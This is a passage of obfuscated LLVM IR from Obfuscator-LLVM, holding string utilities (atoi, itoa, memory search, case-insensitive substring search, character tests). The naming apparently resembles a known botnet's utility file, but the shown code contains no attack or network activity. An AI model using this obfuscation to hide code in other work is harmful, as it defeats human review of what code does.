  %10 = add i32 %9, -1
  %11 = add i32 %10, 846510117
  %12 = add nsw i32 %8, -1
  store i32 %11, i32* %4, align 4
  %13 = icmp ne i32 %8, 0
  br i1 %13, label %14, label %17

; <label>:14:                                     ; preds = %7
  %15 = load i8*, i8** %5, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %5, align 8
  store i8 0, i8* %15, align 1
  br label %7

; <label>:17:                                     ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_atoi(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

; <label>:11:                                     ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

; <label>:16:                                     ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

; <label>:24:                                     ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

; <label>:29:                                     ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

; <label>:32:                                     ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

; <label>:37:                                     ; preds = %32, %29
  br label %38

; <label>:38:                                     ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %41, i64* %7, align 8
  %42 = load i64, i64* %7, align 8
  %43 = load i32, i32* %4, align 4
  %44 = sext i32 %43 to i64
  %45 = urem i64 %42, %44
  %46 = trunc i64 %45 to i32
  store i32 %46, i32* %10, align 4
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = load i64, i64* %7, align 8
  %50 = udiv i64 %49, %48
  store i64 %50, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %51

; <label>:51:                                     ; preds = %113, %38
  %52 = load i32, i32* %6, align 4
  %53 = trunc i32 %52 to i8
  %54 = call i32 @util_isdigit(i8 signext %53)
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %62

; <label>:56:                                     ; preds = %51
  %57 = load i32, i32* %6, align 4
  %58 = sub i32 %57, -1917219745
  %59 = sub i32 %58, 48
  %60 = add i32 %59, -1917219745
  %61 = sub nsw i32 %57, 48
  store i32 %60, i32* %6, align 4
  br label %80

; <label>:62:                                     ; preds = %51
  %63 = load i32, i32* %6, align 4
  %64 = trunc i32 %63 to i8
  %65 = call i32 @util_isalpha(i8 signext %64)
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %78

; <label>:67:                                     ; preds = %62
  %68 = load i32, i32* %6, align 4
  %69 = trunc i32 %68 to i8
  %70 = call i32 @util_isupper(i8 signext %69)
  %71 = icmp ne i32 %70, 0
  %72 = select i1 %71, i32 55, i32 87
  %73 = load i32, i32* %6, align 4
  %74 = sub i32 %73, 1062691211
  %75 = sub i32 %74, %72
  %76 = add i32 %75, 1062691211
  %77 = sub nsw i32 %73, %72
  store i32 %76, i32* %6, align 4
  br label %79

; <label>:78:                                     ; preds = %62
  br label %118

; <label>:79:                                     ; preds = %67
  br label %80

; <label>:80:                                     ; preds = %79, %56
  %81 = load i32, i32* %6, align 4
  %82 = load i32, i32* %4, align 4
  %83 = icmp sge i32 %81, %82
  br i1 %83, label %84, label %85

; <label>:84:                                     ; preds = %80
  br label %118

; <label>:85:                                     ; preds = %80
  %86 = load i32, i32* %9, align 4
  %87 = icmp slt i32 %86, 0
  br i1 %87, label %100, label %88

; <label>:88:                                     ; preds = %85
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp ugt i64 %89, %90
  br i1 %91, label %100, label %92

; <label>:92:                                     ; preds = %88
  %93 = load i64, i64* %5, align 8
  %94 = load i64, i64* %7, align 8
  %95 = icmp eq i64 %93, %94
  br i1 %95, label %96, label %101

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %6, align 4
  %98 = load i32, i32* %10, align 4
  %99 = icmp sgt i32 %97, %98
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %96, %88, %85
  store i32 -1, i32* %9, align 4
  br label %112

; <label>:101:                                    ; preds = %96, %92
  store i32 1, i32* %9, align 4
  %102 = load i32, i32* %4, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = mul i64 %104, %103
  store i64 %105, i64* %5, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %5, align 8
  %109 = sub i64 0, %107
  %110 = sub i64 %108, %109
  %111 = add i64 %108, %107
  store i64 %110, i64* %5, align 8
  br label %112

; <label>:112:                                    ; preds = %101, %100
  br label %113

; <label>:113:                                    ; preds = %112
  %114 = load i8*, i8** %3, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %3, align 8
  %116 = load i8, i8* %114, align 1
  %117 = sext i8 %116 to i32
  store i32 %117, i32* %6, align 4
  br label %51

; <label>:118:                                    ; preds = %84, %78
  %119 = load i32, i32* %9, align 4
  %120 = icmp slt i32 %119, 0
  br i1 %120, label %121, label %125

; <label>:121:                                    ; preds = %118
  %122 = load i32, i32* %8, align 4
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %124, i64* %5, align 8
  br label %135

; <label>:125:                                    ; preds = %118
  %126 = load i32, i32* %8, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %134

; <label>:128:                                    ; preds = %125
  %129 = load i64, i64* %5, align 8
  %130 = add i64 0, 6994621580281047002
  %131 = sub i64 %130, %129
  %132 = sub i64 %131, 6994621580281047002
  %133 = sub i64 0, %129
  store i64 %132, i64* %5, align 8
  br label %134

; <label>:134:                                    ; preds = %128, %125
  br label %135

; <label>:135:                                    ; preds = %134, %121
  %136 = load i64, i64* %5, align 8
  %137 = trunc i64 %136 to i32
  ret i32 %137
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

; <label>:10:                                     ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

; <label>:18:                                     ; preds = %14, %10, %6, %1
  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

; <label>:14:                                     ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

; <label>:18:                                     ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

; <label>:20:                                     ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [34 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %7, align 8
  %14 = icmp eq i8* %13, null
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %3
  store i8* null, i8** %4, align 8
  br label %93

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* %5, align 4
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %86

; <label>:19:                                     ; preds = %16
  store i32 32, i32* %10, align 4
  %20 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 33
  store i8 0, i8* %20, align 1
  %21 = load i32, i32* %6, align 4
  %22 = icmp eq i32 %21, 10
  br i1 %22, label %23, label %31

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* %5, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %31

; <label>:26:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %27 = load i32, i32* %5, align 4
  %28 = sub i32 0, %27
  %29 = add i32 0, %28
  %30 = sub nsw i32 0, %27
  store i32 %29, i32* %12, align 4
  br label %33

; <label>:31:                                     ; preds = %23, %19
  store i32 0, i32* %9, align 4
  %32 = load i32, i32* %5, align 4
  store i32 %32, i32* %12, align 4
  br label %33

; <label>:33:                                     ; preds = %31, %26
  br label %34

; <label>:34:                                     ; preds = %54, %33
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %68

; <label>:37:                                     ; preds = %34
  %38 = load i32, i32* %12, align 4
  %39 = load i32, i32* %6, align 4
  %40 = urem i32 %38, %39
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* %11, align 4
  %42 = icmp slt i32 %41, 10
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %11, align 4
  %45 = add i32 %44, 1373685951
  %46 = add i32 %45, 48
  %47 = sub i32 %46, 1373685951
  %48 = add nsw i32 %44, 48
  store i32 %47, i32* %11, align 4
  br label %54

; <label>:49:                                     ; preds = %37
  %50 = load i32, i32* %11, align 4
  %51 = sub i32 0, 55
  %52 = sub i32 %50, %51
  %53 = add nsw i32 %50, 55
  store i32 %52, i32* %11, align 4
  br label %54

; <label>:54:                                     ; preds = %49, %43
  %55 = load i32, i32* %11, align 4
  %56 = trunc i32 %55 to i8
  %57 = load i32, i32* %10, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %58
  store i8 %56, i8* %59, align 1
  %60 = load i32, i32* %6, align 4
  %61 = load i32, i32* %12, align 4
  %62 = udiv i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %10, align 4
  %64 = sub i32 %63, 805078074
  %65 = add i32 %64, -1
  %66 = add i32 %65, 805078074
  %67 = add nsw i32 %63, -1
  store i32 %66, i32* %10, align 4
  br label %34

; <label>:68:                                     ; preds = %34
  %69 = load i32, i32* %9, align 4
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %71, label %75

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* %10, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %73
  store i8 45, i8* %74, align 1
  br label %80

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* %10, align 4
  %77 = sub i32 0, 1
  %78 = sub i32 %76, %77
  %79 = add nsw i32 %76, 1
  store i32 %78, i32* %10, align 4
  br label %80

; <label>:80:                                     ; preds = %75, %71
  %81 = load i8*, i8** %7, align 8
  %82 = load i32, i32* %10, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %83
  %85 = call i32 @util_strcpy(i8* %81, i8* %84)
  br label %91

; <label>:86:                                     ; preds = %16
  %87 = load i8*, i8** %7, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 0
  store i8 48, i8* %88, align 1
  %89 = load i8*, i8** %7, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 0, i8* %90, align 1
  br label %91

; <label>:91:                                     ; preds = %86, %80
  %92 = load i8*, i8** %7, align 8
  store i8* %92, i8** %4, align 8
  br label %93

; <label>:93:                                     ; preds = %91, %15
  %94 = load i8*, i8** %4, align 8
  ret i8* %94
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %52, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %59

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add i32 %36, -243396660
  %38 = add i32 %37, 1
  %39 = sub i32 %38, -243396660
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %35
  %44 = load i32, i32* %10, align 4
  %45 = add i32 %44, 470815636
  %46 = add i32 %45, 1
  %47 = sub i32 %46, 470815636
  %48 = add nsw i32 %44, 1
  store i32 %47, i32* %5, align 4
  br label %60

; <label>:49:                                     ; preds = %35
  br label %51

; <label>:50:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %10, align 4
  %54 = sub i32 0, %53
  %55 = sub i32 0, 1
  %56 = add i32 %54, %55
  %57 = sub i32 0, %56
  %58 = add nsw i32 %53, 1
  store i32 %57, i32* %10, align 4
  br label %17

; <label>:59:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:60:                                     ; preds = %59, %43, %15
  %61 = load i32, i32* %5, align 4
  ret i32 %61
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

; <label>:16:                                     ; preds = %109, %3
  %17 = load i32, i32* %6, align 4
  %18 = sub i32 0, -1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, -1
  store i32 %19, i32* %6, align 4
  %21 = icmp sgt i32 %17, 0
  br i1 %21, label %22, label %110

; <label>:22:                                     ; preds = %16
  %23 = load i8*, i8** %8, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %8, align 8
  %25 = load i8, i8* %23, align 1
  store i8 %25, i8* %11, align 1
  %26 = load i8*, i8** %7, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  store i8 %30, i8* %12, align 1
  %31 = load i8, i8* %11, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp sge i32 %32, 65
  br i1 %33, label %34, label %57

; <label>:34:                                     ; preds = %22
  %35 = load i8, i8* %11, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp sle i32 %36, 90
  br i1 %37, label %38, label %57

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* %11, align 1
  %40 = sext i8 %39 to i32
  %41 = xor i32 %40, -1
  %42 = xor i32 96, -1
  %43 = xor i32 -1098106465, -1
  %44 = and i32 %41, -1098106465
  %45 = and i32 %40, %43
  %46 = and i32 %42, -1098106465
  %47 = and i32 96, %43
  %48 = or i32 %44, %45
  %49 = or i32 %46, %47
  %50 = xor i32 %48, %49
  %51 = or i32 %41, %42
  %52 = xor i32 %51, -1
  %53 = or i32 -1098106465, %43
  %54 = and i32 %52, %53
  %55 = or i32 %50, %54
  %56 = or i32 %40, 96
  br label %60

; <label>:57:                                     ; preds = %34, %22
  %58 = load i8, i8* %11, align 1
  %59 = sext i8 %58 to i32
  br label %60

; <label>:60:                                     ; preds = %57, %38
  %61 = phi i32 [ %55, %38 ], [ %59, %57 ]
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %11, align 1
  %63 = load i8, i8* %12, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp sge i32 %64, 65
  br i1 %65, label %66, label %77

; <label>:66:                                     ; preds = %60
  %67 = load i8, i8* %12, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp sle i32 %68, 90
  br i1 %69, label %70, label %77

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* %12, align 1
  %72 = sext i8 %71 to i32
  %73 = and i32 %72, 96
  %74 = xor i32 %72, 96
  %75 = or i32 %73, %74
  %76 = or i32 %72, 96
  br label %80

; <label>:77:                                     ; preds = %66, %60
  %78 = load i8, i8* %12, align 1
  %79 = sext i8 %78 to i32
  br label %80

; <label>:80:                                     ; preds = %77, %70
  %81 = phi i32 [ %75, %70 ], [ %79, %77 ]
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %12, align 1
  %83 = load i8, i8* %11, align 1
  %84 = sext i8 %83 to i32
  %85 = load i8, i8* %12, align 1
  %86 = sext i8 %85 to i32
  %87 = icmp eq i32 %84, %86
  br i1 %87, label %88, label %108

; <label>:88:                                     ; preds = %80
  %89 = load i32, i32* %10, align 4
  %90 = sub i32 0, %89
  %91 = sub i32 0, 1
  %92 = add i32 %90, %91
  %93 = sub i32 0, %92
  %94 = add nsw i32 %89, 1
  store i32 %93, i32* %10, align 4
  %95 = load i32, i32* %9, align 4
  %96 = icmp eq i32 %93, %95
  br i1 %96, label %97, label %107

; <label>:97:                                     ; preds = %88
  %98 = load i8*, i8** %8, align 8
  %99 = load i8*, i8** %5, align 8
  %100 = ptrtoint i8* %98 to i64
  %101 = ptrtoint i8* %99 to i64
  %102 = add i64 %100, 5317570024011025444
  %103 = sub i64 %102, %101
  %104 = sub i64 %103, 5317570024011025444
  %105 = sub i64 %100, %101
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %4, align 4
  br label %111

; <label>:107:                                    ; preds = %88
  br label %109

; <label>:108:                                    ; preds = %80
  store i32 0, i32* %10, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %107
  br label %16

; <label>:110:                                    ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %111

; <label>:111:                                    ; preds = %110, %97
  %112 = load i32, i32* %4, align 4
  ret i32 %112
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146842976}
!2 = !{i32 -2146842567}
